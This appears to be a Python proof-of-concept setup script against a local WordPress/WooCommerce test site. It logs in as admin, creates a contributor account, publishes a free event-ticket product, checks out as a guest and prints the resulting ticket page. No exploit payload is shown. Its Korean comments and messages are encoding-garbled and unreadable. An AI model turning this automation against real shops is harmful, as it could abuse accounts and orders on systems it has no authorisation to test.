import re
import string
import json
import random
import requests
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup

TARGET = "http://localhost:8080"

# Admnistrator
ADMIN_ID = "admin"
ADMIN_PW = "admin"

# Contributor
CONTRIBUTOR_ID = "contributor"
CONTRIBUTOR_PW = "contributor"

PROXY_SERVER = "http://localhost:7777"
proxies = {
    "https": PROXY_SERVER,
    "http": PROXY_SERVER,
}

PRODUCT_TICKET_INFO = {
    "saso_eventtickets_list": 1,
    "saso_eventtickets_is_ticket": "yes",
    "saso_eventtickets_event_location": "Madison Square Garden, New York City",
    "saso_eventtickets_ticket_start_date": "2024-11-27",
    "saso_eventtickets_ticket_start_time": "00:00",
    "saso_eventtickets_ticket_end_date": "2024-11-27",
    "saso_eventtickets_ticket_end_time": "12:00",
    "saso_eventtickets_ticket_max_redeem_amount":1,
    "saso_eventtickets_ticket_is_ticket_info":"",
    "saso_eventtickets_ticket_amount_per_item":1,
    "saso_eventtickets_request_name_per_ticket_label":"",
    "saso_eventtickets_request_value_per_ticket_label":"",
    "saso_eventtickets_request_value_per_ticket_values":"",
    "saso_eventtickets_request_value_per_ticket_def":"",
    "saso_eventtickets_list_formatter_values": json.dumps({"input_prefix_codes":"","input_type_codes":"1","input_amount_letters":12,"input_letter_excl":"2","input_letter_style":1,"input_include_numbers":"1","input_serial_delimiter":"1","input_serial_delimiter_space":None,"input_number_start":10000,"input_number_offset":1})
}

def poc():

    ####
    # 1. ÏÉÅÌíà Îì±Î°ù Î∞è ÏÇ¨Ïö©Ïûê('Contributor') Ï∂îÍ∞ÄÎ•º ÏúÑÌïú Admin Í≥ÑÏ†ï Î°úÍ∑∏Ïù∏
    ####
    print(f"[+] Ïñ¥ÎìúÎØº Í≥ÑÏ†ïÏúºÎ°ú Î°úÍ∑∏Ïù∏Ìï©ÎãàÎã§.")
    print(f"[>] Í≥ÑÏ†ï: {ADMIN_ID}, ÎπÑÎ∞ÄÎ≤àÌò∏: {ADMIN_PW}")
    admin_session = requests.session()
    data = {
        "log": ADMIN_ID,
        "pwd": ADMIN_PW,
        "wp-submit": "Log In",
        "testcookie": 1
    }
    admin_session.post(f"{TARGET}/wp-login.php", data=data, proxies=proxies)
    admin_session.get(f"{TARGET}/wp-admin/", proxies=proxies)

    ####
    # 2. ÏÇ¨Ïö©Ïûê('Contributor') Îì±Î°ù
    ####
    print(f"[+] ÏÇ¨Ïö©Ïûê('Contributor') Í≥ÑÏ†ïÏùÑ ÏÉùÏÑ±Ìï©ÎãàÎã§.")
    print(f"[>] Í≥ÑÏ†ï: {CONTRIBUTOR_ID}, ÎπÑÎ∞ÄÎ≤àÌò∏: {CONTRIBUTOR_PW}")
    resp = admin_session.get(f"{TARGET}/wp-admin/user-new.php", proxies=proxies)
    pattern = r'_wpnonce_create-user" value="(.{10})"'
    match = re.search(pattern, resp.text)
    if match:
        wp_nonce = match.group(1)
        data = {
            "action": "createuser",
            "_wpnonce_create-user": wp_nonce,
            "_wp_http_referer": "/wp-admin/user-new.php",
            "user_login": f"{CONTRIBUTOR_ID}",
            "email": f"{CONTRIBUTOR_ID}@example.com",
            "first_name": "",
            "last_name": "",
            "url": "",
            "pass1": f"{CONTRIBUTOR_PW}",
            "pass2": f"{CONTRIBUTOR_PW}",
            "pw_weak": "on",
            "send_user_notification": 1,
            "role": "contributor",
            "createuser": "Add+New+User"
        }
        admin_session.post(f"{TARGET}/wp-admin/user-new.php", data=data, proxies=proxies)

        ###
        # 3. ÏÉÅÌíà Îì±Î°ù with Event Tickets
        ###
        resp = admin_session.get(f"{TARGET}/wp-admin/post-new.php?post_type=product", proxies=proxies)
        pattern = r'<input[^>]*name=[\'"]([^\'"]+)[\'"][^>]*value=[\'"]([^\'"]+)[\'"]'
        matches = re.findall(pattern, resp.text)
        data = {}
        for name, value in matches:
            if "-hide" in name: continue
            elif "saso_" in name: continue
            data[name] = value
        data["mm"] = data["cur_mm"] # Undefined array key "mm" in /wp-admin/includes/post.php
        data["visibility"] = "public"  # show product
        data["_visibility"] = "visible" # show product
        data["_regular_price"] = 0
        data["post_title"] = "üî• Consert Ticket Open Event üî•"
        
        # Ìã∞Ïºì Ï†ïÎ≥¥ Ï∂îÍ∞Ä
        for ticket_key, ticket_value in PRODUCT_TICKET_INFO.items():
            data[ticket_key] = ticket_value
        
        # ÏÉÅÌíà Îì±Î°ù
        resp = admin_session.post(f"{TARGET}/wp-admin/post.php", data=data, proxies=proxies)
        
        # ÏÉÅÌíà Î≤àÌò∏ Í∞ÄÏ†∏Ïò§Í∏∞
        post_ID = data['post_ID']

        ###
        # 3. ÏÉÅÌíà Íµ¨Îß§
        ###
        guest_session = requests.session()
        resp = guest_session.get(f"{TARGET}/shop", proxies=proxies)
        pattern1 = r'storeApiNonce: \'(.{10})\''
        pattern2 = r'createNonceMiddleware\( "(.{10})" \)'
        match1 = re.search(pattern1, resp.text)
        match2 = re.search(pattern2, resp.text)
        if match1 and match2:
            store_nonce = match1.group(1)
            wp_nonce = match2.group(1)

            # Ïπ¥Ìä∏ Îã¥Í∏∞
            data = {"requests":[{"path":"/wc/store/v1/cart/add-item","method":"POST","data":{"id":post_ID,"quantity":1},"cache":"no-store","body":{"id":post_ID,"quantity":1},"headers":{"Nonce":store_nonce}}]}
            guest_session.post(f"{TARGET}/wp-json/wc/store/v1/batch", json=data, proxies=proxies)
            
            # Í≤∞Ï†ú Ï§ÄÎπÑ
            guest_session.get(f"{TARGET}/checkout/", proxies=proxies)

            # Í≤∞Ï†ú ÏöîÏ≤≠
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            data = {"additional_fields":{},"billing_address":{"first_name":"firstname","last_name":"lastname","company":"","address_1":"address","address_2":"","city":"city","state":"","postcode":"12345","country":"KR","email":"guest@guest.com","phone":""},"create_account":False,"customer_note":"","customer_password":"","extensions":{"woocommerce/order-attribution":{"source_type":"typein","referrer":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","utm_source_platform":"(none)","utm_creative_format":"(none)","utm_marketing_tactic":"(none)","session_entry":f"{TARGET}","session_start_time":f"{current_time}","session_pages":"3","session_count":"1","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36"}},"shipping_address":{"first_name":"firstname","last_name":"lastname","company":"","address_1":"address","address_2":"","city":"city","state":"","postcode":"12345","country":"KR","phone":""}}
            headers = {
                "Nonce": store_nonce,
                "X-WP-Nonce": wp_nonce,
                "Content-Type": "application/json"
            }
            resp = guest_session.post(f"{TARGET}/wp-json/wc/store/v1/checkout", json=data, headers=headers, proxies=proxies)
            checkout_json = resp.json()
            try:
                order_redirect_url = checkout_json['payment_result']['redirect_url']
                
                ###
                # 4. Í≤∞Ï†ú ÌôïÏù∏ Î∞è Ìã∞Ïºì ÏÇ¨Ïù¥Ìä∏ Ï°∞Ìöå
                ###
                resp = guest_session.get(f"{order_redirect_url}", proxies=proxies)
                pattern = r'Ticket number: <a target="_blank" href="([^"]+)"'
                match = re.search(pattern, resp.text)
                if match:
                    ticket_url = match.group(1)
                    resp = requests.get(f"{ticket_url}", proxies=proxies)
                    print(f"[+] Ticket Url: {ticket_url}")
                    print(f"[+] ")
                    print(resp.text)
                else:
                    print(f"[-] Í≤∞Ï†ú ÌôïÏù∏ ÏÇ¨Ïù¥Ìä∏ÏóêÏÑú Ìã∞Ïºì ÏÇ¨Ïù¥Ìä∏Î•º Î∞úÍ≤¨ÌïòÏßÄ Î™ªÌñàÏäµÎãàÎã§.")
            except:
                print(f"[-] Í≤∞Ï†úÎ•º Ïã§Ìå®ÌñàÏäµÎãàÎã§.")
        else:
            print(f"[-] ÏÉÅÌíà ÌéòÏù¥ÏßÄÏóêÏÑú storeApiNonce Í∞íÏùÑ Î∞úÍ≤¨Ìï† Ïàò ÏóÜÏäµÎãàÎã§.")


    else:
        print(f"[-] ÏÇ¨Ïö©Ïûê('contributor') Ï∂îÍ∞ÄÏóê Ïã§Ìå®ÌñàÏäµÎãàÎã§.")
        


if __name__ == "__main__":
    poc()
